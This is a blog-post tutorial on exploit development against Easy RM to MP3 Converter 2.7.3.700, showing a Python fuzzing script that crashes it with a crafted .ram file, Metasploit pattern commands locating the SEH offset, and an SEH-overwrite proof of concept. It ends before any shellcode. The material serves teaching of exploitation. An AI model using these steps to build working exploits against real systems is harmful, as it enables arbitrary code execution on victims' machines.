---
layout: post
title: Easy RM to MP3 Converter 2.7.3.700 - Structured Exception Handling Overwrite
date: 2020-03-24 14:45:00
categories: posts
comments: false
en: true
---

# Preamble
Welcome again! Today i will be explaining a vulnerability i have found within this software, which i have found while gathering in [Exploit-DB](https://www.exploit-db.com/exploits/39933).

# The Bug
Easy RM to MP3 Converter in version 2.7.3.700 suffers from multiple Buffer Overflows and SEH overwrites, meaning that arbitrary code execution can be leveraged through crafted files. Due this software can process different types of files such as ram, rm, smi, wax, wvx, wvm, and so forth, such exploitation can be done through such extensions. This will be explained further within this post.

To begin, a small fuzzing script is created, which will create a file named as "finding2.ram", containing 50 thousand bytes of A's:

```term_session
import struct

buffer = "A" * 50000

f = open ("finding2.ram", "w")
f.write(buffer)
f.close()
```

After the script is run and the application is started, click 'Cancel'

![](/assets/img/Findings2/0.png)

The button 'Load' is selected:

![](/assets/img/Findings2/1.png)

Select the file created by the script, making the program to load the malicious file, and as a result, crashing:

![](/assets/img/Findings2/2.png)

![](/assets/img/Findings2/3.png)

SEH Chain:

![](/assets/img/Findings2/4.png)

A pattern is created with msf-pattern_create into a file called "pattern":

```term_session
root@kali:~# msf-pattern_create -l 50000 > pattern 
root@kali:~# 
```

Such chain of bytes is copied into the PoC.

Updated PoC:

![](/assets/img/Findings2/5.png)

After this is copied, executed and finally selected by the program, the SEH Chain gives the next values:

![](/assets/img/Findings2/6.png)

The nSEH value is copied and the offset is found using msf-pattern_offset:

```term_session
root@kali:~# msf-pattern_offset -q 66473965 -l 50000 
[*] Exact match at offset 4828
[*] Exact match at offset 25108
[*] Exact match at offset 45388
root@kali:~# 
```

As it is seen on the image, the program outputs different offsets, let's try with the last one, 45388.

Updated PoC:

```term_session
import struct

buffer = "A" * 45388 + "BBBB" + "CCCC"

f = open ("finding2.ram", "w")
f.write(buffer)
f.close()
```

After the aforementioned process is once again repeated, the SEH Chain is overwritten by the desired values:

![](/assets/img/Findings2/7.png)

The modules are listed:

![](/assets/img/Findings2/8.png)

Despite the great variety of possible modules to pick in order to find a reliable POP POP RETN address, this is a SEH Overwrite in which it does not need further bytes after the POP POP RETN sequence in order to generate an exception, as a result, making it possible to exploit this application with a 3-byte overwrite, which would be a great demostration within this blog post. In this case, the module with a base address along with a NULL-byte is "RM2MP3Converter.exe".

Listing possible POP POP RETN sequences within the module "RM2MP3Converter.exe":

![](/assets/img/Findings2/8-2.png)
